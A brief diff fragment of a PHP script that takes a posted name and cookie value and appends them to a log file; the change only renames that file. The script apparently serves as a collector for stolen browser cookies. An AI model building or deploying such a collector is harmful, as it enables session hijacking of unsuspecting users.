@@ -16,7 +16,7 @@
 <?php
 $name = $_POST['name'];
 $cookie = $_POST['cookie'];
-$fifo = fopen('m4st3r_code.txt', 'a');
+$fifo = fopen('m4st3r.txt', 'a');
 
 if (is_null($cookie) == FALSE) {
     date_default_timezone_set("Asia/Dhaka");
